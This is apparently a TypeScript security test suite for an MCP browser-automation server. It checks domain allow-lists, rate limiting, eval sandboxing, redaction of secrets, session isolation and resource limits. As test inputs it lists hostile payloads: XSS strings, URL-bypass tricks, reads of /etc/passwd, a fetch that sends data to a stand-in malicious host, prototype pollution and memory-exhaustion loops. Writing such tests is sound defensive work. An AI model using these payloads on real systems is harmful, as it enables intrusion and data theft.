// Security penetration tests for the MCP browser server
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { MCPBrowserServer } from '../../src/server/mcp-browser-server.js';
import { SessionManager } from '../../src/browser/session-manager.js';
import { SecurityManager } from '../../src/security/security-manager.js';
import { PerformanceManager } from '../../src/performance/performance-manager.js';
import { chromium, type Browser } from 'playwright';
import { createMockMCPClient } from '../mocks/mock-mcp-client.js';

describe('Security Penetration Tests', () => {
  let server: MCPBrowserServer;
  let browser: Browser;
  let sessionManager: SessionManager;
  let securityManager: SecurityManager;
  let performanceManager: PerformanceManager;

  beforeAll(async () => {
    browser = await chromium.launch({ headless: true });
    
    sessionManager = new SessionManager({
      maxSessions: 10,
      sessionTimeout: 300000,
      cleanupInterval: 60000
    });

    securityManager = new SecurityManager({
      allowedDomains: ['example.com', 'httpbin.org'],
      rateLimits: {
        requestsPerMinute: 60,
        requestsPerHour: 1000
      },
      sensitiveHeaders: ['authorization', 'cookie', 'x-api-key', 'x-auth-token'],
      maxRequestSize: 1024 * 1024, // 1MB
      enableCSPBypass: false
    });

    performanceManager = new PerformanceManager({
      contextPool: { minPoolSize: 2, maxPoolSize: 8 },
      memoryLimits: { maxSessionMemoryMB: 256 },
      diskManager: { maxTotalSizeMB: 100 }
    });

    await sessionManager.initialize();
    await performanceManager.initialize(browser);

    server = new MCPBrowserServer();
    await server.initializeWithManagers(sessionManager, securityManager, performanceManager);
  });

  afterAll(async () => {
    if (server?.isServerRunning()) {
      await server.stop();
    }
    await sessionManager?.shutdown();
    await performanceManager?.shutdown();
    await browser?.close();
  });

  beforeEach(async () => {
    await sessionManager.destroyAllSessions();
  });

  afterEach(async () => {
    await sessionManager.destroyAllSessions();
  });

  describe('Domain Security Tests', () => {
    it('should prevent navigation to unauthorized domains', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({
        allowedDomains: ['example.com']
      });
      
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;
      const gotoTool = server.getTool('browser.goto');

      // Test various unauthorized domains
      const unauthorizedDomains = [
        'https://malicious-site.com',
        'https://google.com',
        'https://facebook.com',
        'http://localhost:8080',
        'https://192.168.1.1',
        'file:///etc/passwd',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>'
      ];

      for (const url of unauthorizedDomains) {
        const result = await gotoTool.handler({ sessionId, url });
        
        expect(result.isError).toBe(true);
        const response = JSON.parse(result.content[0].text);
        expect(response.error.category).toBe('security');
        expect(response.error.message).toContain('not in the allowed domains list');
      }
    });

    it('should handle subdomain restrictions correctly', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({
        allowedDomains: ['example.com']
      });
      
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;
      const gotoTool = server.getTool('browser.goto');

      // Test subdomain attempts
      const subdomainTests = [
        { url: 'https://sub.example.com', shouldAllow: false },
        { url: 'https://example.com.malicious.com', shouldAllow: false },
        { url: 'https://malicious.example.com', shouldAllow: false },
        { url: 'https://example.com', shouldAllow: true },
        { url: 'https://www.example.com', shouldAllow: false } // Unless explicitly allowed
      ];

      for (const test of subdomainTests) {
        const result = await gotoTool.handler({ sessionId, url: test.url });
        
        if (test.shouldAllow) {
          expect(result.isError).toBe(false);
        } else {
          expect(result.isError).toBe(true);
          const response = JSON.parse(result.content[0].text);
          expect(response.error.category).toBe('security');
        }
      }
    });

    it('should prevent domain bypass attempts', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({
        allowedDomains: ['example.com']
      });
      
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;
      const gotoTool = server.getTool('browser.goto');

      // Test various bypass attempts
      const bypassAttempts = [
        'https://example.com@malicious.com',
        'https://example.com.malicious.com',
        'https://malicious.com/example.com',
        'https://malicious.com?redirect=example.com',
        'https://malicious.com#example.com',
        'https://example.com/../../../malicious.com',
        'https://example.com%2emalicious.com',
        'https://example.com%00.malicious.com'
      ];

      for (const url of bypassAttempts) {
        const result = await gotoTool.handler({ sessionId, url });
        
        expect(result.isError).toBe(true);
        const response = JSON.parse(result.content[0].text);
        expect(response.error.category).toBe('security');
      }
    });
  });

  describe('Rate Limiting Tests', () => {
    it('should enforce rate limits per session', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      
      // Make rapid requests to trigger rate limiting
      const rapidRequests = Array.from({ length: 100 }, (_, i) =>
        gotoTool.handler({
          sessionId,
          url: `https://example.com?request=${i}`
        })
      );

      const results = await Promise.allSettled(rapidRequests);
      
      const successful = results.filter(r => 
        r.status === 'fulfilled' && !r.value.isError
      );
      const rateLimited = results.filter(r => 
        r.status === 'fulfilled' && 
        r.value.isError && 
        JSON.parse(r.value.content[0].text).error.category === 'security'
      );

      console.log(`Rate limiting test:`);
      console.log(`  Total requests: ${rapidRequests.length}`);
      console.log(`  Successful: ${successful.length}`);
      console.log(`  Rate limited: ${rateLimited.length}`);

      expect(rateLimited.length).toBeGreaterThan(0); // Some requests should be rate limited
      expect(successful.length).toBeLessThan(rapidRequests.length); // Not all should succeed
    });

    it('should handle rate limiting across multiple sessions', async () => {
      const sessionCount = 5;
      const requestsPerSession = 20;

      // Create multiple sessions
      const newContextTool = server.getTool('browser.newContext');
      const sessionResults = await Promise.all(
        Array.from({ length: sessionCount }, () => newContextTool.handler({}))
      );

      const sessionIds = sessionResults.map(r => 
        JSON.parse(r.content[0].text).sessionId
      );

      // Make requests from all sessions simultaneously
      const gotoTool = server.getTool('browser.goto');
      const allRequests = sessionIds.flatMap(sessionId =>
        Array.from({ length: requestsPerSession }, (_, i) =>
          gotoTool.handler({
            sessionId,
            url: `https://example.com?session=${sessionId}&request=${i}`
          })
        )
      );

      const results = await Promise.allSettled(allRequests);
      
      const successful = results.filter(r => 
        r.status === 'fulfilled' && !r.value.isError
      );
      const rateLimited = results.filter(r => 
        r.status === 'fulfilled' && 
        r.value.isError && 
        JSON.parse(r.value.content[0].text).error.category === 'security'
      );

      console.log(`Multi-session rate limiting test:`);
      console.log(`  Sessions: ${sessionCount}`);
      console.log(`  Requests per session: ${requestsPerSession}`);
      console.log(`  Total requests: ${allRequests.length}`);
      console.log(`  Successful: ${successful.length}`);
      console.log(`  Rate limited: ${rateLimited.length}`);

      expect(rateLimited.length).toBeGreaterThan(0);
      expect(successful.length).toBeGreaterThan(0);
    });
  });

  describe('JavaScript Execution Security Tests', () => {
    it('should prevent malicious JavaScript execution', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      // Navigate to a safe page first
      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      const evalTool = server.getTool('browser.eval');

      // Test various malicious JavaScript attempts
      const maliciousScripts = [
        // File system access attempts
        'require("fs").readFileSync("/etc/passwd")',
        'process.env',
        'global.process',
        
        // Network requests
        'fetch("https://malicious.com/steal-data")',
        'new XMLHttpRequest()',
        
        // DOM manipulation for XSS
        'document.body.innerHTML = "<script>alert(\\"xss\\")</script>"',
        'document.createElement("script").src = "https://malicious.com/xss.js"',
        
        // Infinite loops
        'while(true) {}',
        'for(;;) { console.log("spam"); }',
        
        // Memory exhaustion
        'let arr = []; while(true) arr.push(new Array(1000000))',
        
        // Prototype pollution
        'Object.prototype.isAdmin = true',
        '__proto__.isAdmin = true',
        
        // Function constructor abuse
        'Function("return process")().exit()',
        'new Function("return this")().process'
      ];

      for (const script of maliciousScripts) {
        const result = await evalTool.handler({
          sessionId,
          code: script,
          timeout: 1000 // Short timeout to prevent hanging
        });

        // Should either error or be sanitized
        if (!result.isError) {
          const response = JSON.parse(result.content[0].text);
          // If it succeeds, the result should be sanitized
          expect(response.result).not.toContain('process');
          expect(response.result).not.toContain('/etc/passwd');
        }
      }
    });

    it('should enforce JavaScript execution timeouts', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      const evalTool = server.getTool('browser.eval');

      // Test long-running scripts
      const longRunningScripts = [
        'let start = Date.now(); while(Date.now() - start < 10000) {}', // 10 second loop
        'for(let i = 0; i < 1000000000; i++) { Math.random(); }', // CPU intensive
        'let arr = []; for(let i = 0; i < 1000000; i++) arr.push(i); arr.join("")' // Memory intensive
      ];

      for (const script of longRunningScripts) {
        const startTime = performance.now();
        const result = await evalTool.handler({
          sessionId,
          code: script,
          timeout: 2000 // 2 second timeout
        });
        const executionTime = performance.now() - startTime;

        // Should timeout or complete quickly
        expect(executionTime).toBeLessThan(5000); // Should not take more than 5 seconds
        
        if (result.isError) {
          const response = JSON.parse(result.content[0].text);
          expect(response.error.message).toMatch(/timeout|execution/i);
        }
      }
    });
  });

  describe('Data Sanitization Tests', () => {
    it('should sanitize sensitive data in network logs', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      // Navigate to httpbin to generate network requests with headers
      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://httpbin.org/headers'
      });

      // Simulate requests with sensitive headers (this would normally be done by the browser)
      const session = sessionManager.getSession(sessionId);
      if (session) {
        // Add mock network logs with sensitive data
        session.addNetworkLog({
          url: 'https://httpbin.org/headers',
          method: 'GET',
          status: 200,
          requestHeaders: {
            'authorization': 'Bearer secret-token-12345',
            'cookie': 'session=abc123; user=admin',
            'x-api-key': 'super-secret-api-key',
            'user-agent': 'Test Browser'
          },
          responseHeaders: {
            'set-cookie': 'new-session=xyz789; HttpOnly',
            'content-type': 'application/json'
          },
          timestamp: new Date(),
          duration: 150
        });
      }

      // Get network logs
      const networkTool = server.getTool('browser.network.getRecent');
      const networkResult = await networkTool.handler({
        sessionId,
        limit: 10
      });

      expect(networkResult.isError).toBe(false);
      const response = JSON.parse(networkResult.content[0].text);
      
      // Check that sensitive headers are sanitized
      const logs = response.logs;
      expect(logs).toBeDefined();
      
      for (const log of logs) {
        if (log.requestHeaders) {
          expect(log.requestHeaders.authorization).toBe('[REDACTED]');
          expect(log.requestHeaders.cookie).toBe('[REDACTED]');
          expect(log.requestHeaders['x-api-key']).toBe('[REDACTED]');
          expect(log.requestHeaders['user-agent']).toBeDefined(); // Non-sensitive header should remain
        }
        
        if (log.responseHeaders) {
          expect(log.responseHeaders['set-cookie']).toBe('[REDACTED]');
          expect(log.responseHeaders['content-type']).toBeDefined(); // Non-sensitive header should remain
        }
      }
    });

    it('should sanitize sensitive data in console logs', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      // Execute JavaScript that logs sensitive data
      const evalTool = server.getTool('browser.eval');
      await evalTool.handler({
        sessionId,
        code: `
          console.log('User password: secret123');
          console.log('API key: sk-1234567890abcdef');
          console.log('Credit card: 4111-1111-1111-1111');
          console.log('SSN: 123-45-6789');
          console.log('Normal log message');
        `
      });

      // Get console logs
      const consoleTool = server.getTool('browser.console.getRecent');
      const consoleResult = await consoleTool.handler({
        sessionId,
        limit: 10
      });

      expect(consoleResult.isError).toBe(false);
      const response = JSON.parse(consoleResult.content[0].text);
      
      const logs = response.logs;
      expect(logs).toBeDefined();
      
      // Check that sensitive patterns are sanitized
      for (const log of logs) {
        expect(log.message).not.toMatch(/secret123/);
        expect(log.message).not.toMatch(/sk-[a-zA-Z0-9]+/);
        expect(log.message).not.toMatch(/4111-1111-1111-1111/);
        expect(log.message).not.toMatch(/123-45-6789/);
        
        // Normal messages should remain
        if (log.message.includes('Normal log message')) {
          expect(log.message).toContain('Normal log message');
        }
      }
    });
  });

  describe('Session Isolation Tests', () => {
    it('should prevent cross-session data access', async () => {
      const newContextTool = server.getTool('browser.newContext');
      
      // Create two sessions
      const session1Result = await newContextTool.handler({});
      const session2Result = await newContextTool.handler({});
      
      const session1Id = JSON.parse(session1Result.content[0].text).sessionId;
      const session2Id = JSON.parse(session2Result.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      const evalTool = server.getTool('browser.eval');

      // Set up different data in each session
      await gotoTool.handler({
        sessionId: session1Id,
        url: 'https://example.com'
      });

      await evalTool.handler({
        sessionId: session1Id,
        code: 'window.secretData = "session1-secret"; localStorage.setItem("user", "alice");'
      });

      await gotoTool.handler({
        sessionId: session2Id,
        url: 'https://example.com'
      });

      await evalTool.handler({
        sessionId: session2Id,
        code: 'window.secretData = "session2-secret"; localStorage.setItem("user", "bob");'
      });

      // Try to access data from each session
      const session1DataResult = await evalTool.handler({
        sessionId: session1Id,
        code: 'JSON.stringify({ secret: window.secretData, user: localStorage.getItem("user") })'
      });

      const session2DataResult = await evalTool.handler({
        sessionId: session2Id,
        code: 'JSON.stringify({ secret: window.secretData, user: localStorage.getItem("user") })'
      });

      expect(session1DataResult.isError).toBe(false);
      expect(session2DataResult.isError).toBe(false);

      const session1Data = JSON.parse(JSON.parse(session1DataResult.content[0].text).result);
      const session2Data = JSON.parse(JSON.parse(session2DataResult.content[0].text).result);

      // Each session should only see its own data
      expect(session1Data.secret).toBe('session1-secret');
      expect(session1Data.user).toBe('alice');
      expect(session2Data.secret).toBe('session2-secret');
      expect(session2Data.user).toBe('bob');
    });

    it('should prevent session hijacking attempts', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const validSessionId = JSON.parse(contextResult.content[0].text).sessionId;

      // Try to use invalid/manipulated session IDs
      const invalidSessionIds = [
        'invalid-session-id',
        validSessionId + '-modified',
        validSessionId.replace(/./g, '0'),
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'null',
        'undefined',
        '',
        '0',
        '-1'
      ];

      const gotoTool = server.getTool('browser.goto');

      for (const sessionId of invalidSessionIds) {
        const result = await gotoTool.handler({
          sessionId,
          url: 'https://example.com'
        });

        expect(result.isError).toBe(true);
        const response = JSON.parse(result.content[0].text);
        expect(response.error.message).toMatch(/session.*not found/i);
      }
    });
  });

  describe('Input Validation Tests', () => {
    it('should validate and sanitize URL inputs', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');

      // Test various malicious URL inputs
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.com/file.txt',
        'chrome://settings/',
        'about:blank',
        'vbscript:msgbox("xss")',
        'jar:http://malicious.com!/file.jar',
        'view-source:https://example.com',
        'moz-extension://extension-id/page.html',
        'chrome-extension://extension-id/page.html',
        'resource://firefox/page.html'
      ];

      for (const url of maliciousUrls) {
        const result = await gotoTool.handler({ sessionId, url });
        
        expect(result.isError).toBe(true);
        const response = JSON.parse(result.content[0].text);
        expect(response.error.message).toMatch(/invalid|unsupported|security/i);
      }
    });

    it('should validate selector inputs', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      const clickTool = server.getTool('browser.click');

      // Test various malicious selector inputs
      const maliciousSelectors = [
        'javascript:alert("xss")',
        '<script>alert("xss")</script>',
        'eval("alert(\\"xss\\")")',
        'document.body.innerHTML = "<script>alert(\\"xss\\")</script>"',
        'window.location = "https://malicious.com"',
        'fetch("https://malicious.com/steal-data")',
        '../../../etc/passwd',
        '${process.env}',
        '#{7*7}',
        '{{7*7}}',
        '<%=7*7%>',
        'x'.repeat(10000) // Very long selector
      ];

      for (const selector of maliciousSelectors) {
        const result = await clickTool.handler({ sessionId, selector });
        
        // Should either error or safely handle the selector
        if (!result.isError) {
          // If it doesn't error, it should be safely handled
          const response = JSON.parse(result.content[0].text);
          expect(response.error?.message).toMatch(/element not found/i);
        }
      }
    });

    it('should validate and limit request sizes', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      const evalTool = server.getTool('browser.eval');

      // Test very large JavaScript code
      const largeCode = 'console.log("' + 'x'.repeat(2 * 1024 * 1024) + '");'; // 2MB string

      const result = await evalTool.handler({
        sessionId,
        code: largeCode
      });

      expect(result.isError).toBe(true);
      const response = JSON.parse(result.content[0].text);
      expect(response.error.message).toMatch(/size|limit|large/i);
    });
  });

  describe('Resource Exhaustion Tests', () => {
    it('should prevent memory exhaustion attacks', async () => {
      const newContextTool = server.getTool('browser.newContext');
      const contextResult = await newContextTool.handler({});
      const sessionId = JSON.parse(contextResult.content[0].text).sessionId;

      const gotoTool = server.getTool('browser.goto');
      await gotoTool.handler({
        sessionId,
        url: 'https://example.com'
      });

      const evalTool = server.getTool('browser.eval');

      // Try to exhaust memory
      const memoryExhaustionCode = `
        let arrays = [];
        try {
          for (let i = 0; i < 1000; i++) {
            arrays.push(new Array(1000000).fill('memory-exhaustion-test'));
          }
        } catch (e) {
          'Memory limit reached: ' + e.message;
        }
      `;

      const result = await evalTool.handler({
        sessionId,
        code: memoryExhaustionCode,
        timeout: 5000
      });

      // Should either timeout, error, or be limited
      if (!result.isError) {
        const response = JSON.parse(result.content[0].text);
        expect(response.result).toMatch(/memory limit|error/i);
      }

      // System should still be responsive
      const screenshotTool = server.getTool('browser.screenshot');
      const screenshotResult = await screenshotTool.handler({ sessionId });
      expect(screenshotResult.isError).toBe(false);
    });

    it('should prevent disk space exhaustion', async () => {
      const sessionCount = 5;
      const screenshotsPerSession = 20;

      // Create multiple sessions
      const newContextTool = server.getTool('browser.newContext');
      const sessionResults = await Promise.all(
        Array.from({ length: sessionCount }, () => newContextTool.handler({}))
      );

      const sessionIds = sessionResults.map(r => 
        JSON.parse(r.content[0].text).sessionId
      );

      const gotoTool = server.getTool('browser.goto');
      const screenshotTool = server.getTool('browser.screenshot');

      // Navigate all sessions
      await Promise.all(sessionIds.map(sessionId =>
        gotoTool.handler({ sessionId, url: 'https://example.com' })
      ));

      // Try to fill disk with screenshots
      const screenshotPromises = sessionIds.flatMap(sessionId =>
        Array.from({ length: screenshotsPerSession }, () =>
          screenshotTool.handler({ sessionId, fullPage: true })
        )
      );

      const results = await Promise.allSettled(screenshotPromises);
      
      const successful = results.filter(r => 
        r.status === 'fulfilled' && !r.value.isError
      );
      const failed = results.filter(r => 
        r.status === 'rejected' || (r.status === 'fulfilled' && r.value.isError)
      );

      console.log(`Disk exhaustion test:`);
      console.log(`  Total screenshot attempts: ${screenshotPromises.length}`);
      console.log(`  Successful: ${successful.length}`);
      console.log(`  Failed: ${failed.length}`);

      // Should have some failures due to disk limits
      expect(failed.length).toBeGreaterThan(0);

      // Check disk usage
      const perfStats = performanceManager.getPerformanceStats();
      console.log(`  Disk usage: ${perfStats.disk.usagePercent.toFixed(1)}%`);
      
      // Should not exceed 100% disk usage
      expect(perfStats.disk.usagePercent).toBeLessThanOrEqual(100);
    });
  });

  describe('Authentication and Authorization Tests', () => {
    it('should handle unauthorized tool access attempts', async () => {
      // Create a mock client that tries to access tools without proper session
      const mockClient = createMockMCPClient();
      await mockClient.connect();

      // Try to call tools without valid session
      const toolsToTest = [
        'browser.goto',
        'browser.screenshot',
        'browser.eval',
        'browser.click'
      ];

      for (const toolName of toolsToTest) {
        try {
          const result = await mockClient.callTool(toolName, {
            sessionId: 'unauthorized-session',
            url: 'https://example.com'
          });
          
          // Should fail with authorization error
          expect(result.isError).toBe(true);
        } catch (error) {
          // Expected to fail
          expect(error).toBeDefined();
        }
      }

      await mockClient.disconnect();
    });

    it('should validate session ownership', async () => {
      // Create two separate "clients" with their own sessions
      const newContextTool = server.getTool('browser.newContext');
      
      const client1Session = await newContextTool.handler({});
      const client2Session = await newContextTool.handler({});
      
      const session1Id = JSON.parse(client1Session.content[0].text).sessionId;
      const session2Id = JSON.parse(client2Session.content[0].text).sessionId;

      // Try to use client1's session from client2's context
      const gotoTool = server.getTool('browser.goto');
      
      // This should work - client1 using its own session
      const validResult = await gotoTool.handler({
        sessionId: session1Id,
        url: 'https://example.com'
      });
      expect(validResult.isError).toBe(false);

      // In a real implementation, there would be client authentication
      // For now, we test that sessions are properly isolated
      const session1 = sessionManager.getSession(session1Id);
      const session2 = sessionManager.getSession(session2Id);
      
      expect(session1).toBeDefined();
      expect(session2).toBeDefined();
      expect(session1!.id).not.toBe(session2!.id);
    });
  });
});